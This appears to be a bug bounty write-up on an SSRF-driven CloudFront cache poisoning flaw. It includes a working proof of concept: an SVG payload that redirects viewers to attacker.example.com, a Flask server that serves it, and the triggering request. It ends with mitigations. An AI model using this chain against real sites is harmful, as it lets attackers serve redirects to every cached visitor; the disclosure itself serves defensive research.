SSRF‑Induced Cache Poisoning Logic Bug

In this write‑up, I’ll share a novel cache poisoning variant discovered during a BugCrowd engagement. This flaw stems from a mis‑designed proxy‑fetch feature and allows attacker‑controlled content to be cached by CloudFront. Let’s dive in.

1. Vendor Feedback

The bug originates from an exposed Proxy Controller Endpoint, which I initially reported as SSRF (P5 Informational). The program considered SSRF—fetching external or attacker‑controlled URLs—as low impact. They recommended elevating the impact before re‑assessment.

2. Discovery of Cache Poisoning

While testing SSRF, a colleague noticed the target would only fetch responses with Content-Type: image/svg+xml. Using text/html resulted in 400 Bad Request. Switching to image/svg+xml returned 200 OK, confirming SSRF worked.

  • text/html ⇒ 400

  • image/svg+xml ⇒ 200

Uniquely, CloudFront cached this attacker‑controlled SVG response—unexpected in typical cache poisoning scenarios.

Note: I used RequestRepo to simulate various response headers.

3. Proof‑of‑Concept

3.1 SVG Payload (poc.xml)


<?xml version="1.0" encoding="UTF-8"?>

<svg  xmlns="http://www.w3.org/2000/svg">

<foreignObject  width="100%"  height="100%">

<body  xmlns="http://www.w3.org/1999/xhtml">

<meta  http-equiv="refresh"  content="0; url=https://attacker.example.com/"  />

</body>

</foreignObject>

</svg>

3.2 Attacker Server (Python Flask)


from flask import Flask, make_response

import os

  

app = Flask(__name__)

  

@app.route('/poc.xml')

def  serve_payload():

with  open('poc.xml', 'rb') as f:

resp = make_response(f.read())

resp.headers.set('Content-Type', 'image/svg+xml')

return resp

  

if  __name__ == '__main__':

app.run(host='0.0.0.0', port=5505)

3.3 SSRF Endpoint Request


GET /media?u=http://vps:5505/poc.xml HTTP/1.1

Host: vuln.example.com

CloudFront response headers:


X-Cache: Hit from cloudfront

Age: 5

4. Logs Analysis

Despite sending 30 requests, Server Vuln was only invoked twice:

  1. 1st & 2nd fetch: CloudFront had no cache, so it forwarded to Server Attacker.

  2. 3rd onward: CloudFront served from cache, no new fetches logged.

This behavior confirms cache poisoning: attacker content “froze” in CDN and was served to all subsequent users.

6. Why “Logic Bug Flaw”?

  • Standard Cache Poisoning: Misconfigured headers (Host, X-Forwarded-*) or faulty Cache-Control.

  • Logic Bug Flaw: Legitimate proxy‑fetch feature allows arbitrary URLs. Developers didn’t foresee Fetch → Cache → Serve logic enabling attacker content to be cached by CDN.

Summary: This is a business logic vulnerability—abuse of a valid feature—rather than mere header or cache misconfiguration.

7. Mitigation Recommendations

  1. Whitelist allowed domains for proxy‑fetch.

  2. Validate Content-Type of fetched responses.

  3. Apply Cache-Control: no-store or Vary headers on the SSRF endpoint.

  4. Rate‑limit and monitor proxy‑fetch usage.
